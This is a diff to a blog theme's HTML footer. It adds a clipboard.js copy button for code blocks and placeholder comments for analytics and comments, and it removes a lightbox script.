+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
 
 <script src="/js/main.js"></script>
 
+<!-- search -->
 
+<!-- Baidu Analytics -->
 
+<!-- Cloudflare Analytics -->
 
+<!-- Disqus Comments -->
 
+<!-- utterances Comments -->
 
-  <script src="/js/simple-lightbox.min.js"></script><script>document.addEventListener('DOMContentLoaded', function() {new SimpleLightbox('.post-detail .simple-lightbox', {fileExt: false,captionsData:'alt'});});</script></body>
+</body>
 </html>
-
